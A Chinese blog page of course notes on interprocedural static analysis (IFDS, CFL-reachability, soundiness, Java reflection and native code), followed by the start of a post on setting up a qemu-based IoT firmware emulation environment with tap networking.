        <h3 id="Supergraph"   >
          <a href="#Supergraph" class="heading-link"><i class="fas fa-link"></i></a><a href="#Supergraph" class="headerlink" title="Supergraph"></a>Supergraph</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316102200598.png" alt="image-20230316102200598"></p>
<ul>
<li><code>G* = (N* , E*)</code> : 即每个函数都有自己的<code>FG(flowgraph)</code>，这里的例子即为<code>G_main/G_p</code>，而<code>G_main</code>加上<code>G_p</code>一起组成了整个程序的<code>G*</code>。</li>
<li>每个函数的<code>FG</code>中都会有<code>s_p</code>入口，以及<code>e_p</code>出口。此外对于函数调用的实现用<code>call_p/ret_p</code>来体现。</li>
</ul>

        <h4 id="G"   >
          <a href="#G" class="heading-link"><i class="fas fa-link"></i></a><a href="#G" class="headerlink" title="G*"></a>G*</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316102726071.png" alt="image-20230316102726071"></p>
<p>在每个程序调用中都有三种不同的边</p>
<ul>
<li><code>call-to-return-site edge</code> : 图中紫色的边，<code>Call_p-&gt;Ret_P</code>，在当前函数中。</li>
<li><code>call-to-start edge</code> : 图中绿色的边，<code>Call_p-&gt;S_p</code>，在不同函数中</li>
<li><code>exit-to-return-site edge</code> : 图中深蓝色的边，<code>e_p-&gt;Ret_p</code>，在函数返回时跳转到调用点</li>
</ul>

        <h4 id="Design-Flow-Functions"   >
          <a href="#Design-Flow-Functions" class="heading-link"><i class="fas fa-link"></i></a><a href="#Design-Flow-Functions" class="headerlink" title="Design Flow Functions"></a>Design Flow Functions</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316103727673.png" alt="image-20230316103727673"></p>
<ul>
<li><code>N*</code> : 程序中在没有实际运行前可能没有被初始化的变量</li>
<li><code>λ e_param.e_body</code> : 想想成一个匿名函数，<code>λ</code>为函数名，<code>e_param</code>为函数参数，<code>e_body</code>为函数体，相关的例子如上。</li>
</ul>

        <h5 id="例子-6"   >
          <a href="#例子-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-6" class="headerlink" title="例子"></a>例子</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316104651630.png" alt="image-20230316104651630"></p>
<ul>
<li><p>首先将未被初始化的变量加入集合<code>S</code> : <code>λ S.&#123;x,g&#125;</code></p>
</li>
<li><p><code>x=0 -&gt; Call_p</code> : 代表<code>x</code>被初始化了，那么需要从集合<code>s</code>中减去<code>x</code>，即为<code>λ S.S-&#123;x&#125;</code></p>
</li>
<li><p><code>Call_p -&gt; S_p</code> : 发生了函数调用，相关参数的值发生传递，即将集合<code>s</code>中所有<code>x</code>替换成<code>a</code>，即为<code>λ S.S</code></p>
</li>
<li><p><code>a=a-g -&gt; Call_p</code> : 当<code>a</code>或者<code>g</code>任意一个变量没有被初始化，那么<code>a</code>就没有被初始化，那么就将<code>a</code>并入到集合<code>s</code>，即为<code>S ∪ &#123;a&#125; </code>。反之，<code>a/g</code>都被初始化了，就代表<code>a</code>也会被初始化，那么就需要从集合<code>s</code>中减去<code>a</code>，即为<code>S - &#123;a&#125;</code></p>
</li>
<li><p><code>Call_p -&gt; Ret_p</code> : </p>
<p>主要考虑两个情况</p>
<ul>
<li>在函数中被初始化了，那么传回来的<code>S</code>中就不会包含<code>g</code>，<code>S-&#123;g&#125;</code>也不包含<code>g</code>，两者相合不包含<code>g</code>，准确</li>
<li>在函数中没有被初始化，那么传回来的<code>S</code>中包含<code>g</code>，<code>S-&#123;g&#125;</code>不包含<code>g</code>，两者相合包含<code>g</code>，准确</li>
</ul>
<p>同样的如果不是<code>S-&#123;g&#125;</code>，那么情况如下</p>
<ul>
<li>在函数中被初始化了，那么传回来的<code>S</code>中就不会包含<code>g</code>，<code>S</code>包含<code>g</code>，两者相合包含<code>g</code>，不准确</li>
<li>在函数中没有被初始化，那么传回来的<code>S</code>中包含<code>g</code>，<code>S</code>包含<code>g</code>，两者相合包含<code>g</code>，准确</li>
</ul>
<p>这样<code>S-&#123;g&#125;</code>就会更加准确</p>
</li>
<li><p><code>e_p -&gt; Ret_p</code> : 发生了函数返回，需要减去本地变量，即为<code>λ S.S-&#123;a&#125;</code></p>
</li>
</ul>

        <h3 id="Exploded-Supergraph"   >
          <a href="#Exploded-Supergraph" class="heading-link"><i class="fas fa-link"></i></a><a href="#Exploded-Supergraph" class="headerlink" title="Exploded Supergraph"></a>Exploded Supergraph</h3>
      
        <h4 id="概念-2"   >
          <a href="#概念-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#概念-2" class="headerlink" title="概念"></a>概念</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316113507233.png" alt="image-20230316113507233"></p>
<ul>
<li>需要建立一个<code>representation relations (graphs)</code></li>
<li>每一个<code>flow function</code>都可以被表示成<code>2(D+1)</code>个节点的关系连边，<code>D</code>是<code>dataflow facts</code>的集合</li>
</ul>

        <h4 id="Rule规则"   >
          <a href="#Rule规则" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule规则" class="headerlink" title="Rule规则"></a>Rule规则</h4>
      <ul>
<li><code>0-&gt;0</code> : 无条件存在</li>
<li><code>0-&gt;x</code> : 即无条件产生了<code>x</code></li>
<li><code>x-&gt;y</code> : 即在有<code>x</code>的情况下，会产生<code>y</code></li>
</ul>
<p>大概依据上图可以判断一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316114330648.png" alt="image-20230316114330648"></p>
<p>最终需要依据规则，将<code>G*</code>转化为<code>G#</code></p>

        <h4 id="Why-We-Need-Edge-0-⟶-0"   >
          <a href="#Why-We-Need-Edge-0-⟶-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#Why-We-Need-Edge-0-⟶-0" class="headerlink" title="Why We Need Edge 0 ⟶ 0?"></a>Why We Need Edge 0 ⟶ 0?</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316121445007.png" alt="image-20230316121445007"></p>
<p>即需要<code>0-&gt;0</code>的边来在某点产生新的变量，使得传递<code>reach</code>成立，否则就没办法表达能够<code>reach</code>的概念，那么加入<code>0-&gt;0</code>如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316121607565.png" alt="image-20230316121607565"></p>

        <h4 id="例子-7"   >
          <a href="#例子-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-7" class="headerlink" title="例子"></a>例子</h4>
      <p>依据相关规则得到如下结果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316121704079.png" alt="image-20230316121704079"></p>
<p>这个应该不难得到，通过这个图即可判断一些变量是否可达，比如下图画圈的<code>g</code>点就在<code>realizable paths</code>中可达</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316154149995.png" alt="image-20230316154149995"></p>
<p>而下图画圈的<code>g</code>点只会在<code>non-realizable paths</code>中可达，因为该路径括号其实是不匹配的。</p>
<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20230316154211337.png" alt="image-20230316154211337"></p>

        <h3 id="Tabulation-Algorithm"   >
          <a href="#Tabulation-Algorithm" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tabulation-Algorithm" class="headerlink" title="Tabulation Algorithm"></a>Tabulation Algorithm</h3>
      <p>依据<code>G#</code>，通过该算法寻找<code>realizable paths</code>寻找变量可达路径。该算法比较复杂，课程进行了简单介绍。具体算法如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316193520580.png" alt="image-20230316193520580"></p>
<p>看到<code>bsauce</code>师傅写的真好：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/148255285" >【课程笔记】南大软件分析课程11——CFL可达性&amp;IFDS（课时15） - 知乎 (zhihu.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li>时间复杂度O(ED^3)</li>
</ul>

        <h4 id="Core-Working-Mechanism-of-Tabulation-Algorithm"   >
          <a href="#Core-Working-Mechanism-of-Tabulation-Algorithm" class="heading-link"><i class="fas fa-link"></i></a><a href="#Core-Working-Mechanism-of-Tabulation-Algorithm" class="headerlink" title="Core Working Mechanism of Tabulation Algorithm"></a>Core Working Mechanism of Tabulation Algorithm</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230316192306135.png" alt="image-20230316192306135"></p>
<p>即依照给的顺序依次进行<code>reach</code>可达探测，但是完成<code>Four</code>之后，再碰到<code>Five</code>，就直接进行连边了，因为<code>Two</code>已经进行探测了，不需要再计算一遍了。</p>

        <h2 id="4-Understanding-the-Distributivity-of-IFDS"   >
          <a href="#4-Understanding-the-Distributivity-of-IFDS" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Understanding-the-Distributivity-of-IFDS" class="headerlink" title="4.Understanding the Distributivity of IFDS"></a>4.Understanding the Distributivity of IFDS</h2>
      <p>帮助判断该问题是否可用<code>IFDS</code>来解决</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317100320870.png" alt="image-20230317100320870"></p>
<p>不可以用标准的<code>IFDS</code>来解决这两个问题</p>

        <h3 id="Distributivity"   >
          <a href="#Distributivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Distributivity" class="headerlink" title="Distributivity"></a>Distributivity</h3>
      <p>常见的分配律</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317100927589.png" alt="image-20230317100927589"></p>

        <h3 id="Constant-Propagation"   >
          <a href="#Constant-Propagation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Constant-Propagation" class="headerlink" title="Constant Propagation"></a>Constant Propagation</h3>
      <p>但是对于<code>Constant Propagation</code>，该语句中的<code>z</code>的结果依赖于<code>x/y</code>共同的结果，并不能单独处理之后得到结果，无法满足分配律。这里其实就有点不懂了，比如之前提到的如下情况，不也是处理两个输入吗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317105418025.png" alt="image-20230317105418025"></p>
<p>有点不太理解，mark一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317101652497.png" alt="image-20230317101652497"></p>
<ul>
<li>当一个语句需要考虑多种输入数据才能得到正确结果时，就不是<code>distributive</code>可分配的，不能用<code>IFDS</code></li>
<li>在<code>IFDS</code>中，所有的数据以及传播都需可以被单独处理，这些单独处理并不会导致最终结果的正确性发生改变。</li>
<li><code>IFDS</code>一次<code>f</code>只能处理一个<code>data input</code></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317102104425.png" alt="image-20230317102104425"></p>
<p>比如上述语句<code>y = 2x + 3</code>可以用<code>IFDS</code>来进行常量传播分析</p>

        <h3 id="Pointer-Analysis"   >
          <a href="#Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Pointer-Analysis" class="headerlink" title="Pointer Analysis"></a>Pointer Analysis</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317102902311.png" alt="image-20230317102902311"></p>
<p>这个分析中，最开始分析没有图中红线部分，需要添加一个别名信息才可以<code>alias</code>，即<code>y=x</code>这个情况，但是需要别名信息的话，又要处理多个输入<code>x/y</code>，所以不能用<code>IFDS</code></p>

        <h2 id="总结-9"   >
          <a href="#总结-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-9" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317110045113.png" alt="image-20230317110045113"></p>
<p>理解<code>CFL-Reachability</code>(括号匹配问题)，基础的<code>IFDS</code>，以及什么问题可以用<code>IFDS</code>进行解决</p>

        <h1 id="十五、Soundness-and-Soundiness"   >
          <a href="#十五、Soundness-and-Soundiness" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、Soundness-and-Soundiness" class="headerlink" title="十五、Soundness and Soundiness"></a>十五、Soundness and Soundiness</h1>
      
        <h2 id="1-Soundness-and-Soundiness"   >
          <a href="#1-Soundness-and-Soundiness" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Soundness-and-Soundiness" class="headerlink" title="1.Soundness and Soundiness"></a>1.Soundness and Soundiness</h2>
      
        <h3 id="Soundness"   >
          <a href="#Soundness" class="heading-link"><i class="fas fa-link"></i></a><a href="#Soundness" class="headerlink" title="Soundness"></a>Soundness</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230317115113287.png" alt="image-20230317115113287"></p>
<p>可以分析程序所有可能的执行结果，包括动态运行的，称为<code>Sound</code>。但是无论学术界还是工业界中，基本都是<code>UnSound</code>，即无法分析到程序所有可能的执行结果。</p>

        <h3 id="Hard-Language-Features-for-Static-Analysis"   >
          <a href="#Hard-Language-Features-for-Static-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hard-Language-Features-for-Static-Analysis" class="headerlink" title="Hard Language Features for Static Analysis"></a>Hard Language Features for Static Analysis</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318104624160.png" alt="image-20230318104624160"></p>
<p>即一些比较难以进行程序分析的语言。</p>
<p>有的分析研究希望能够寻找到一个保守估计的结果进行分析，比如<code>C/C++</code>里面的<code>Point</code>的地址进行加减的时候，就将该整个块当作指针可能的结果进行分析，但是也会相当不准确。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318104906691.png" alt="image-20230318104906691"></p>
<p>大部分的研究说分析是<code>Sound</code>的，其实都不是<code>Sound</code>，这些都会造成一些误导，导致过分依赖这个分析。</p>

        <h3 id="Soundiness"   >
          <a href="#Soundiness" class="heading-link"><i class="fas fa-link"></i></a><a href="#Soundiness" class="headerlink" title="Soundiness"></a>Soundiness</h3>
      <p>2015年是一些学者出来呼吁说程序分析的研究要标注<code>Soundiness</code>。即在发表的研究结果中，某些难以分析的部分需要充分说明，并且标注<code>Soundy</code>，表示告诉读者这部分在努力实现<code>Sound</code>，但是也不一定能够达到<code>Sound</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318110806642.png" alt="image-20230318110806642"></p>

        <h3 id="对比"   >
          <a href="#对比" class="heading-link"><i class="fas fa-link"></i></a><a href="#对比" class="headerlink" title="对比"></a>对比</h3>
      <p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20230318110826465.png" alt="image-20230318110826465"></p>
<ul>
<li><code>Sound</code> : 比较理想化，能够处理程序所有可能的运行结果</li>
<li><code>Soundy</code> : 企图处理程序所有可能的运行结果，但在<code>hard language features</code>可以是<code>unsound</code>的，进行大概处理。</li>
<li><code>Unsound</code> : 为了相关的精度、效率等故意不处理某些部分。</li>
</ul>

        <h2 id="2-Hard-Language-Feature-Java-Reflection"   >
          <a href="#2-Hard-Language-Feature-Java-Reflection" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Hard-Language-Feature-Java-Reflection" class="headerlink" title="2.Hard Language Feature: Java Reflection"></a>2.Hard Language Feature: Java Reflection</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318111512158.png" alt="image-20230318111512158"></p>
<p>对于程序分析而言，<code>JAVA reflection</code>使得分析<code>JAVA</code>变得很困难</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318111619066.png" alt="image-20230318111619066"></p>

        <h3 id="Java-Reflection"   >
          <a href="#Java-Reflection" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h3>
      <p>这个可以参考一下<code>p</code>神讲的</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings" >GitHub - phith0n/JavaThings: Share Things Related to Java - Java安全漫谈笔记相关内容</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318111949117.png" alt="image-20230318111949117"></p>
<p>即利用反射相关<code>API</code>来获取<code>JAVA</code>中类，然后通过类创建对象，获取属性，修改属性等，这里讲得听清楚的。</p>

        <h3 id="Why-We-Need-to-Analyze-Java-Reflection"   >
          <a href="#Why-We-Need-to-Analyze-Java-Reflection" class="heading-link"><i class="fas fa-link"></i></a><a href="#Why-We-Need-to-Analyze-Java-Reflection" class="headerlink" title="Why We Need to Analyze Java Reflection?"></a>Why We Need to Analyze Java Reflection?</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318112836799.png" alt="image-20230318112836799"></p>
<p>依据之前学到的指针分析，其实在分析的时候，不一定能检测出来该指针指向的是哪个对象，也可能分析出来指向多个对象。那么当调用到<code>m.invoke</code>这种反射里面常见的<code>API</code>时，由于<code>m</code>解析不正确，那么就会导致<code>m.invoke</code>没办法正常调用，就会出现<code>bug</code>。</p>
<p>或者在另一个例子中，两条流向会使得<code>a.fld</code>指向两个对象，那么就会导致<code>B b’ = (B) a.fld;</code>的<code>cast</code>发生错误。</p>

        <h3 id="How-to-Analyze-Java-Reflection"   >
          <a href="#How-to-Analyze-Java-Reflection" class="heading-link"><i class="fas fa-link"></i></a><a href="#How-to-Analyze-Java-Reflection" class="headerlink" title="How to Analyze Java Reflection?"></a>How to Analyze Java Reflection?</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318113227337.png" alt="image-20230318113227337"></p>

        <h4 id="String-Constant-Analysis-Pointer-Analysis"   >
          <a href="#String-Constant-Analysis-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#String-Constant-Analysis-Pointer-Analysis" class="headerlink" title="String Constant Analysis/Pointer Analysis"></a>String Constant Analysis/Pointer Analysis</h4>
      <p>从<code>05</code>年开始出现一种方法。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318113708808.png" alt="image-20230318113708808"></p>
<p>如果在反射中，相关的字符串通过<code>String Constant Analysis</code>可以求得，那么即可进行相关解析。但是如果没办法求得的时候，比如旁边黄色框列出来的部分，就没办法进行反射解析了。</p>

        <h4 id="Type-Inference-String-analysis-Pointer-Analysis"   >
          <a href="#Type-Inference-String-analysis-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Type-Inference-String-analysis-Pointer-Analysis" class="headerlink" title="Type Inference/String analysis/Pointer Analysis"></a>Type Inference/String analysis/Pointer Analysis</h4>
      <p>14年出现另一个方法，即老师们提出的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318114007467.png" alt="image-20230318114007467"></p>
<p>概括如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318114151787.png" alt="image-20230318114151787"></p>
<p>即使用该反射的时候可进行解析</p>
<p><img src="../../AppData/Roaming/Typora/typora-user-images/image-20230318115246794.png" alt="image-20230318115246794"></p>
<p>在该例子中，由于函数名是<code>_</code>加上<code>CMD</code>确定的，所以无法准确解析到对应的函数。</p>
<p>观察函数调用点<code>175</code>行，可以看到其<code>parameters</code>是个<code>Object[]</code>数组，那么这里创建的<code>Object[]</code>数组其类型必定在<code>JAVA</code>导入包中某些类，比如这里的<code>FrameworkCommandInterpreter</code>，是其<code>sub/supertypes</code>子类或者父类。</p>
<p>依据这个信息，在<code>JAVA</code>类型系统中寻找匹配相关的函数，会找出来很多函数，在该例子中，有50个函数被找到，其中48个函数都是可能会被调用的，即<code>true</code>。</p>
<p>这方面的最新研究也是老师们的研究最前沿</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318115926089.png" alt="image-20230318115926089"></p>
<p>求解到的反射对象更准确更多，并且可以说出哪里解的不准。</p>

        <h4 id="Assisted-by-Dynamic-Analysis"   >
          <a href="#Assisted-by-Dynamic-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Assisted-by-Dynamic-Analysis" class="headerlink" title="Assisted by Dynamic Analysis"></a>Assisted by Dynamic Analysis</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318120030439.png" alt="image-20230318120030439"></p>
<p>利用动态分析来求解，比如上面的<code>cmd</code>，将之用一个模糊用例进行动态执行，类似现今很流行的模糊测试，当匹配用例上证明就可能会调用到。</p>
<p>优点是求解出来的一定是准确的，因为必定是可能调用到的。</p>
<p>缺点就是常见的模糊测试的缺点，覆盖路径有限，比较慢。</p>

        <h2 id="3-Hard-Language-Feature-Native-Code"   >
          <a href="#3-Hard-Language-Feature-Native-Code" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Hard-Language-Feature-Native-Code" class="headerlink" title="3.Hard Language Feature: Native Code"></a>3.Hard Language Feature: Native Code</h2>
      
        <h3 id="Native-Code"   >
          <a href="#Native-Code" class="heading-link"><i class="fas fa-link"></i></a><a href="#Native-Code" class="headerlink" title="Native Code"></a>Native Code</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318155627496.png" alt="image-20230318155627496"></p>
<p><code>JAVA</code>代码从头往下的相关函数调用，其中相关的动态链接库中的代码就是<code>Native Code</code>，用<code>IDA</code>打开即为相关的汇编代码，可以直接运行在对应的操作系统<code>CPU</code>上的。但是在下面的分析中，还是看它的源代码形式，比如<code>C/C++</code>形式。</p>

        <h3 id="Java-Native-Interface-JNI"   >
          <a href="#Java-Native-Interface-JNI" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java-Native-Interface-JNI" class="headerlink" title="Java Native Interface (JNI)"></a>Java Native Interface (JNI)</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318160018163.png" alt="image-20230318160018163"></p>
<p>用来和相关动态链接库进行交互的编程框架，比如<code>JAVA</code>就可以调用到<code>C/C++</code>编写的动态链接库，即为<code>JNI</code>框架</p>

        <h3 id="Why-Native-Code-is-Hard-to-Analyze"   >
          <a href="#Why-Native-Code-is-Hard-to-Analyze" class="heading-link"><i class="fas fa-link"></i></a><a href="#Why-Native-Code-is-Hard-to-Analyze" class="headerlink" title="Why Native Code is Hard to Analyze?"></a>Why Native Code is Hard to Analyze?</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318162255276.png" alt="image-20230318162255276"></p>
<p>在<code>JNI</code>例子中，首先加载动态链接库，声明函数。其中<code>*env</code>变量用来传递<code>JAVA</code>中相关的一些信息，可以在<code>Native Code</code>中创建对象、属性、调用<code>JAVA</code>中的方法等。主要问题是跨语言之后，如何静态分析<code>je.guessMe()</code>这个调用?</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/1ca6e11b1e72" >【课程笔记】南大软件分析课程12——Soundiness（课时16） - 简书 (jianshu.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>因为<code>Native Code</code>是在库里面了，其源代码基本没有，只有一个接口库文件<code>.so/.dll</code>，那么就比较难进行分析了。</p>

        <h3 id="How-to-Handle-Native-Code"   >
          <a href="#How-to-Handle-Native-Code" class="heading-link"><i class="fas fa-link"></i></a><a href="#How-to-Handle-Native-Code" class="headerlink" title="How to Handle Native Code?"></a>How to Handle Native Code?</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318162203276.png" alt="image-20230318162203276"></p>
<p>手动建模分析</p>

        <h4 id="Native-Code-Modeling-Example"   >
          <a href="#Native-Code-Modeling-Example" class="heading-link"><i class="fas fa-link"></i></a><a href="#Native-Code-Modeling-Example" class="headerlink" title="Native Code Modeling (Example)"></a>Native Code Modeling (Example)</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318163010673.png" alt="image-20230318163010673"></p>
<p>直接将对应的函数简化成<code>JAVA</code>代码来进行分析，相当于<code>hook</code>掉相关的<code>API</code>，然后用类似功能的<code>JAVA</code>代码来替换掉。</p>

        <h4 id="前沿"   >
          <a href="#前沿" class="heading-link"><i class="fas fa-link"></i></a><a href="#前沿" class="headerlink" title="前沿"></a>前沿</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318163145075.png" alt="image-20230318163145075"></p>
<p>前沿的一些分析，此外可以参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://soundiness.org进行深入研究./" >http://soundiness.org进行深入研究。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="总结-10"   >
          <a href="#总结-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-10" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230318163231858.png" alt="image-20230318163231858"></p>
<p>理解<code>Soundiness</code>的大概概念，以及<code>JAVA</code>反射机制和<code>Native Code</code>为什么比较难分析。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/01/05/IOT%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">IOT环境搭建</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-01-05</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、固件处理"   >
          <a href="#一、固件处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、固件处理" class="headerlink" title="一、固件处理"></a>一、固件处理</h1>
      
        <h2 id="1-获取"   >
          <a href="#1-获取" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-获取" class="headerlink" title="1.获取"></a>1.获取</h2>
      <p>要么提取，要么从官网下载</p>

        <h2 id="2-解包"   >
          <a href="#2-解包" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解包" class="headerlink" title="2.解包"></a>2.解包</h2>
      <p>一般常用<code>binwalk</code>，有时候可能涉及加密、获取组件相关问题</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://lantern.cool/CVE-d-link-dir-815/#%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96" >D-Link DIR-815 路由器多次溢出漏洞分析 | Lantern’s 小站</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="二、环境搭建"   >
          <a href="#二、环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1>
      
        <h2 id="1-简单启动"   >
          <a href="#1-简单启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-简单启动" class="headerlink" title="1.简单启动"></a>1.简单启动</h2>
      <p><code>IOT</code>相关的基本都是涉及嵌入式，不同架构，常见有<code>arm、mips</code>等，以<code>mips</code>为例子</p>
<p>参考：[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-272318.htm#msg_header_h2_4" >原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>一般用<code>qemu</code>加上对应架构的**<code>linux</code>内核<strong>和</strong>文件系统**来启动，比如如下脚本</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mipsel \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \</span><br><span class="line">	-nographic</span><br></pre></td></tr></table></div></figure>

<p>就可以启动一个系统</p>

        <h2 id="2-网络配置"   >
          <a href="#2-网络配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-网络配置" class="headerlink" title="2.网络配置"></a>2.网络配置</h2>
      <p>最好的肯定是模拟真实的环境，那模拟真实环境肯定就需要涉及到相关网络问题，这里就需要用到<code>qemu</code>一些网络的配置，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/OnlyLove_/article/details/124536607" >(46条消息) Linux 内核调试 七：qemu网络配置_lqonlylove的博客-CSDN博客_qemu 网络配置</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>结合一下，大概如下</p>
<ul>
<li><p>宿主机新建<code>tap</code>网络</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ip tuntap add dev tap0 mode tap</span><br><span class="line">sudo ip link <span class="built_in">set</span> dev tap0 up</span><br><span class="line">sudo ip address add dev tap0 192.168.2.128/24</span><br></pre></td></tr></table></div></figure>

<p>这样就会出现如下网络后端</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221202190656170.png" alt="image-20221202190656170"></p>
</li>
<li><p>然后如下启动脚本，加入网络配置</p>
